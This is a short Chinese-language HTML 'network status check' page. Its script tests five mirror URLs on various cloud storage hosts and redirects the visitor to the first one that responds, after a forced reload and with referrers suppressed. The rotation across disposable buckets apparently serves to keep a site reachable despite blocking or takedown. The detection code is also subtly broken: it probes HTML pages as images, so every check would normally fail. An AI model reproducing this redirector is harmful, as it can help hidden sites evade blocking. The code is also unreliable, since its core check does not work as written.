<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="referrer" content="no-referrer" />
  <title>状态检测</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 2rem; }
    #message{font-size:18px; margin-bottom:20px;}
    #loading {
      width: 40px;
      height: 40px;
      border: 4px solid #ddd;
      border-top-color: #3b82f6;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div id="message">正在检测网络状态，请稍候...</div>
  <div id="loading"></div>
  <script>
    // 页面加载立即强制刷新一次（避免缓存）
    if (!window.location.href.includes("forceReload")) {
      window.location.href = window.location.href + (window.location.href.includes("?") ? "&" : "?") + "forceReload=" + Date.now();
    }
  </script>
  <script>
    const targets = [
      "https://nd11-4go66o6g8f541149-1349994615.tcloudbaseapp.com/#/pages/index/index",
      "https://nd1188.s3.us-west-004.backblazeb2.com/index.html#/pages/index/index",
      "https://dgh8t9e98z90v.cloudfront.net/#/pages/index/index",
      "https://nd113-6gjy9lxh867a0395-1349994615.tcloudbaseapp.com/#/pages/index/index",
      "https://nd881.blob.core.windows.net/www/index.html#/pages/index/index"
    ];
    const TIMEOUT = 3000;

    // 用 Image 对象检测跨域 URL
    function testFetch(url) {
      return new Promise(resolve => {
        const img = new Image();
        let done = false;
        const timer = setTimeout(() => {
          if (!done) { done = true; resolve({ url, ok: false }); }
        }, TIMEOUT);

        img.onload = () => { if (!done) { done = true; clearTimeout(timer); resolve({ url, ok: true }); } };
        img.onerror = () => { if (!done) { done = true; clearTimeout(timer); resolve({ url, ok: false }); } };
        img.src = url + "?t=" + Date.now();
      });
    }

    async function detectAndRedirect() {
      const results = await Promise.all(targets.map(testFetch));

      const working = results.find(r => r.ok);
      if (working) {
        window.location.href = working.url; // 仅有效 URL 才跳转
      } else {
        document.getElementById("message").textContent = "系统维护中，请稍后再试。";
      }
    }

    detectAndRedirect();
  </script>
</body>
</html>
